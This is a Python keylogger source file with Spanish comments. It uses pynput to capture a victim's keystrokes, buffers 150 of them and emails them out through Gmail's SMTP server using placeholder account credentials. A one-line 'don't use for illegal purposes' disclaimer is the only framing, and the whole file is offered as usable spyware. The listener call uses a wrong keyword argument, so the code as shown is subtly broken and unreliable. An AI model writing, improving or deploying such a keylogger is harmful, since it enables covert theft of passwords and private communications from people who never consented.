        #####################################################
        #                      jedahee                      #
        #####################################################

###########################
#FUNCIÓN DEL PROGRAMA
###########################

"""
 Dom't use this program for illegal purposes C: 
"""
#Este programa lee las pulsaciones del teclado, las almacena y cuando llega a cierta cantidad te envia un correo con estas pulsaciones almacenadas

#Importamos las libreias necesarias
from pynput.keyboard import Key, Listener
import smtplib, ssl, time
from multiprocessing import Queue
#Aquí se almacenaran las pulsaciones de la victima
lista = []

#El envio del email
def email(msj):
    #Ciframos el contenido por ssl
    context = ssl.create_default_context()
    #Que intente conectar con el servidor se correo
    try:
        smtpObj = smtplib.SMTP("smtp.gmail.com", 587) #el servidor de correo con el puerto por donde se van a comunicar
        smtpObj.ehlo()
        smtpObj.starttls(context=context) #Inicia la comunicación con el servidor
        smtpObj.ehlo()
        smtpObj.login("Ingresa aquí tu usuario de correo", "Ingresa aquí tu contraseña de correo") #Inicia sesión en tu correo
        smtpObj.sendmail("tu_correo@gamil.com", "tu_correo@gamil.com", str(msj)) #Para enviar el mensaje al correo ingresado
    finally: #Cuando finalice que cierre la conexión
        smtpObj.quit()
        
#Cuando pulses una tecla...
def pulsacion(key):
    #Si es una de estas teclas especiales
    if key == Key.alt_l or key == Key.ctrl_l or key == Key.cmd_r or key == Key.alt_r or key == Key.esc or key == Key.menu or key == Key.tab or key == Key.delete or key == Key.end or key == Key.home or key == Key.insert or key == Key.page_up or key == Key.page_down or key == Key.cmd:
        pass #Que no haga nada porque estas teclas no nos aporta nada
    elif key == Key.enter:
        lista.append("ENTER") #Si pulsa Enter que nos añada a la lisat de pulsaciones "ENTER"... (Esto es para evitar bugs con la lista, para que no aparezca en blanco)
    elif key == Key.space: #Mas de lo mismo...
        lista.append(" ")
    elif key == Key.shift:
        lista.append("SHIFT")
    elif key == Key.backspace:
        lista.append("BORRADO")
    elif key == Key.caps_lock:
        lista.append("MAYUS ACT")
    elif key == Key.up:
        lista.append("FLECHA ARRIBA")
    elif key == Key.down:
        lista.append("FLECHA ABAJO")
    elif key == Key.left:
        lista.append("FLECHA IZQUIERDA")
    elif key == Key.right:
        lista.append("FLECHA DERECHA")
    else:
        lista.append(key)
    
    if len(lista) >= 150: #Si ha hecho mas de 150 caracteres 
        email(lista) #Que envie el email a nuestro correo con las pulsaciones dada
        time.sleep(2) #Que espere dos segundos (Estos dos segundos son esperados para evitar bugs con la lista porque a veces no se borraba del todo)
        del lista[:] #Y borre la lista
#Iniciamos el programa...
with Listener(pulsacion=pulsacion) as listener:
    listener.join() 
